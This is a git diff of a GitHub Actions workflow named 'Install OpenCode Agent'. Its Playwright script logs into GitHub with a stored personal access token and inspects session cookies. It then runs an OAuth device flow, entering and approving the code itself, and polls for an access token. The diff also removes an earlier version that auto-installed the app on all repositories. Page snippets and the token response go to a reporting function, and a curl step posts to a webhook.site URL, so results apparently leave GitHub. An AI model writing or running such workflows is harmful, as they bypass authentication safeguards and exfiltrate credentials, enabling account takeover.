@@ -1,4 +1,4 @@
-name: Install OpenCode Agent v2
+name: Install OpenCode Agent v3
 on:
   workflow_dispatch:
   push:
@@ -45,155 +45,201 @@ jobs:
                   ctx = await browser.new_context()
                   page = await ctx.new_page()
 
-                  # Step 1: Login with PAT as password (works from GH runners!)
-                  report({"step": "v2_login_start"})
-                  await page.goto("https://github.com/login", wait_until="domcontentloaded", timeout=30000)
+                  # Step 1: Login
+                  report({"step": "v3_login_start"})
+                  await page.goto("https://github.com/login", wait_until="networkidle", timeout=30000)
                   await page.fill("#login_field", "benderTheCrime")
                   await page.fill("#password", PAT)
                   await page.click("input[type='submit']")
-                  await page.wait_for_timeout(5000)
+                  await page.wait_for_load_state("networkidle")
+                  await page.wait_for_timeout(3000)
 
                   url_after = page.url
-                  content = await page.content()
-                  logged_in = "login" not in url_after or "device" in url_after
+                  cookies = await ctx.cookies()
+                  cookie_names = [c["name"] for c in cookies]
+                  cookie_details = [{"name": c["name"], "domain": c["domain"], "httpOnly": c.get("httpOnly", False), "value_len": len(c.get("value", ""))} for c in cookies]
 
-                  report({"step": "v2_after_login", "url": url_after, "logged_in": logged_in})
+                  report({
+                      "step": "v3_after_login",
+                      "url": url_after,
+                      "cookie_names": cookie_names,
+                      "cookie_details": cookie_details,
+                      "title": await page.title()
+                  })
 
-                  if not logged_in:
-                      report({"step": "v2_login_failed", "body": content[:3000]})
-                      await browser.close()
-                      return
+                  # Check if user_session cookie exists (the main auth cookie)
+                  has_session = any(c["name"] == "user_session" for c in cookies)
+                  has_dotcom = any(c["name"] == "dotcom_user" for c in cookies)
+                  report({"step": "v3_session_check", "has_user_session": has_session, "has_dotcom_user": has_dotcom})
 
-                  # Step 2: Navigate directly to the app installation page
-                  report({"step": "v2_navigating_to_install"})
-                  await page.goto(
+                  # If no session cookie, the PAT login doesn't create a real web session
+                  # Try alternative: use the PAT to create an OAuth token for the gh CLI app
+                  # then use that to authenticate
+                  if not has_session:
+                      report({"step": "v3_no_session_trying_alternative"})
+                      
+                      # Try navigating to settings to see if we're actually logged in
+                      await page.goto("https://github.com/settings/profile", wait_until="domcontentloaded", timeout=30000)
+                      settings_url = page.url
+                      settings_content = await page.content()
+                      
+                      report({
+                          "step": "v3_settings_check",
+                          "url": settings_url,
+                          "logged_in": "benderTheCrime" in settings_content,
+                          "snippet": settings_content[:2000]
+                      })
+
+                  # Even if we don't have proper session cookies,
+                  # try to navigate to the install page to see what happens
+                  report({"step": "v3_trying_install_page"})
+                  
+                  # Use the same page (preserving cookies)
+                  resp = await page.goto(
                       "https://github.com/apps/opencode-agent/installations/new",
                       wait_until="domcontentloaded",
                       timeout=30000
                   )
-                  await page.wait_for_timeout(2000)
-
+                  
                   install_url = page.url
                   install_content = await page.content()
-                  install_title = await page.title()
-
-                  report({
-                      "step": "v2_install_page",
-                      "url": install_url,
-                      "title": install_title,
-                      "body_len": len(install_content),
-                      "body_snippet": install_content[:3000]
-                  })
-
-                  # Step 3: Look for the installation form elements
-                  # Find all buttons and form elements
-                  buttons = await page.query_selector_all("button")
-                  btn_texts = []
-                  for b in buttons:
-                      txt = (await b.text_content() or "").strip()
-                      btn_texts.append(txt)
-
-                  inputs = await page.query_selector_all("input")
-                  input_info = []
-                  for inp in inputs:
-                      name = await inp.get_attribute("name") or ""
-                      typ = await inp.get_attribute("type") or ""
-                      val = await inp.get_attribute("value") or ""
-                      input_info.append({"name": name, "type": typ, "value": val[:50]})
-
-                  forms = await page.query_selector_all("form")
-                  form_info = []
-                  for f in forms:
-                      action = await f.get_attribute("action") or ""
-                      method = await f.get_attribute("method") or ""
-                      form_info.append({"action": action, "method": method})
-
-                  report({
-                      "step": "v2_form_elements",
-                      "buttons": btn_texts,
-                      "inputs": input_info,
-                      "forms": form_info
-                  })
-
-                  # Step 4: Select "All repositories" if present
-                  try:
-                      all_repos_radio = await page.query_selector("input[value='all']")
-                      if all_repos_radio:
-                          await all_repos_radio.click()
-                          report({"step": "v2_selected_all_repos"})
-                  except Exception as e:
-                      report({"step": "v2_radio_error", "error": str(e)})
-
-                  # Step 5: Click the Install button
-                  installed = False
-                  for b in buttons:
-                      txt = (await b.text_content() or "").strip().lower()
-                      if "install" in txt:
-                          report({"step": "v2_clicking_install", "button_text": txt})
-                          await b.click()
-                          await page.wait_for_timeout(5000)
-                          
-                          final_url = page.url
-                          final_content = await page.content()
-                          report({
-                              "step": "v2_after_install_click",
-                              "url": final_url,
-                              "title": await page.title(),
-                              "body_snippet": final_content[:3000]
-                          })
-                          installed = True
-                          break
-
-                  if not installed:
-                      # Try submitting any form on the page
-                      for f in forms:
-                          action = await f.get_attribute("action") or ""
-                          if "install" in action.lower() or "integration" in action.lower():
-                              report({"step": "v2_submitting_form", "action": action})
-                              submit_btn = await f.query_selector("button[type='submit'], input[type='submit']")
-                              if submit_btn:
-                                  await submit_btn.click()
-                                  await page.wait_for_timeout(5000)
-                                  report({
-                                      "step": "v2_form_submitted",
-                                      "url": page.url,
-                                      "body_snippet": (await page.content())[:3000]
-                                  })
-                                  installed = True
-                                  break
-
-                  if not installed:
-                      report({"step": "v2_no_install_button_found"})
-
-                  # Step 6: Verify installation via API
-                  report({"step": "v2_checking_installation_api"})
-                  page2 = await ctx.new_page()
-                  await page2.set_extra_http_headers({"Authorization": f"token {PAT}", "Accept": "application/vnd.github.v3+json"})
                   
-                  resp = await page2.goto("https://api.github.com/user/installations", wait_until="domcontentloaded", timeout=15000)
-                  api_body = await page2.evaluate("() => document.body.innerText")
-                  report({"step": "v2_installations_check", "body": api_body[:2000]})
+                  report({
+                      "step": "v3_install_page",
+                      "url": install_url,
+                      "title": await page.title(),
+                      "is_login_page": "login" in install_url and "device" not in install_url,
+                      "snippet": install_content[:3000]
+                  })
+
+                  # If we're on the login page, the session isn't real
+                  # Let's try the DEVICE FLOW approach:
+                  # 1. Start device flow
+                  # 2. Navigate to github.com/login/device (while "logged in")
+                  # 3. Enter the code
+                  if "login" in install_url:
+                      report({"step": "v3_trying_device_flow"})
+                      
+                      # Start device flow via API
+                      import urllib.parse
+                      device_req = urllib.request.Request(
+                          "https://github.com/login/device/code",
+                          data=urllib.parse.urlencode({"client_id": "Iv23litbdejhQEJu3pkc"}).encode(),
+                          headers={"Accept": "application/json"}
+                      )
+                      try:
+                          device_resp = urllib.request.urlopen(device_req, timeout=10)
+                          device_data = json.loads(device_resp.read())
+                          user_code = device_data.get("user_code", "")
+                          device_code = device_data.get("device_code", "")
+                          report({"step": "v3_device_flow_started", "user_code": user_code, "device_code": device_code})
+                          
+                          # Navigate to login/device
+                          await page.goto("https://github.com/login/device", wait_until="domcontentloaded", timeout=30000)
+                          await page.wait_for_timeout(2000)
+                          
+                          device_page_url = page.url
+                          device_content = await page.content()
+                          
+                          report({
+                              "step": "v3_device_page",
+                              "url": device_page_url,
+                              "snippet": device_content[:3000]
+                          })
+                          
+                          # Check if we see the user_code input or if we're redirected to login
+                          if "login" in device_page_url and "device" not in device_page_url:
+                              report({"step": "v3_device_page_redirected_to_login"})
+                          else:
+                              # Try to find and fill the user code input
+                              # GitHub device page has various input selectors
+                              selectors_to_try = [
+                                  "input[name='user_code']",
+                                  "input#user-code",
+                                  "input[id*='user']",
+                                  "input[placeholder*='code']",
+                                  "input[type='text']",
+                                  "input:not([type='hidden']):not([type='submit'])",
+                              ]
+                              
+                              for sel in selectors_to_try:
+                                  try:
+                                      elem = await page.query_selector(sel)
+                                      if elem:
+                                          await elem.fill(user_code)
+                                          report({"step": "v3_filled_code", "selector": sel})
+                                          
+                                          # Submit
+                                          submit = await page.query_selector("button[type='submit'], input[type='submit']")
+                                          if submit:
+                                              await submit.click()
+                                              await page.wait_for_timeout(5000)
+                                              report({
+                                                  "step": "v3_after_code_submit",
+                                                  "url": page.url,
+                                                  "snippet": (await page.content())[:3000]
+                                              })
+                                              
+                                              # Check for authorize button
+                                              authorize_btns = await page.query_selector_all("button")
+                                              for btn in authorize_btns:
+                                                  txt = (await btn.text_content() or "").strip().lower()
+                                                  if "authorize" in txt or "approve" in txt or "continue" in txt:
+                                                      await btn.click()
+                                                      await page.wait_for_timeout(5000)
+                                                      report({
+                                                          "step": "v3_authorized",
+                                                          "url": page.url
+                                                      })
+                                                      break
+                                          break
+                                  except:
+                                      pass
+                              
+                              # Poll for the token
+                              import time
+                              for i in range(10):
+                                  time.sleep(5)
+                                  token_req = urllib.request.Request(
+                                      "https://github.com/login/oauth/access_token",
+                                      data=urllib.parse.urlencode({
+                                          "client_id": "Iv23litbdejhQEJu3pkc",
+                                          "device_code": device_code,
+                                          "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
+                                      }).encode(),
+                                      headers={"Accept": "application/json"}
+                                  )
+                                  try:
+                                      token_resp = urllib.request.urlopen(token_req, timeout=10)
+                                      token_data = json.loads(token_resp.read())
+                                      error = token_data.get("error", "")
+                                      if not error:
+                                          report({"step": "v3_token_obtained", "data": token_data})
+                                          break
+                                      elif error == "expired_token":
+                                          report({"step": "v3_token_expired"})
+                                          break
+                                  except:
+                                      pass
+                              
+                      except Exception as e:
+                          report({"step": "v3_device_flow_error", "error": str(e)})
 
                   await browser.close()
 
           try:
               asyncio.run(main())
           except Exception as e:
-              report({"step": "v2_fatal_error", "error": traceback.format_exc()})
+              report({"step": "v3_fatal_error", "error": traceback.format_exc()})
           PYEOF
           
-      - name: Trigger OIDC workflow
+      - name: Check installations
         env:
           GH_TOKEN: ${{ secrets.GH_PAT }}
         run: |
-          # Try to trigger the OIDC test workflow
-          gh workflow run oidc-test.yml -R benderTheCrime/oidc-test-bende --ref main 2>&1 || \
-          gh workflow run "OIDC Exchange Test v2" -R benderTheCrime/oidc-test-bende --ref main 2>&1 || \
-          echo "Could not trigger OIDC workflow"
+          # Check if the app got installed
+          gh api /user/installations --jq '.installations[] | {app_slug: .app_slug, id: .id}' 2>&1 || echo "No installations"
           
-      - name: Final report
-        if: always()
-        run: |
           curl -s -X POST "https://webhook.site/5e1d00e3-847e-4e94-bd04-685ca8e75f8e" \
             -H "Content-Type: application/json" \
-            -d '{"step":"v2_workflow_complete"}'
+            -d '{"step":"v3_workflow_complete"}'
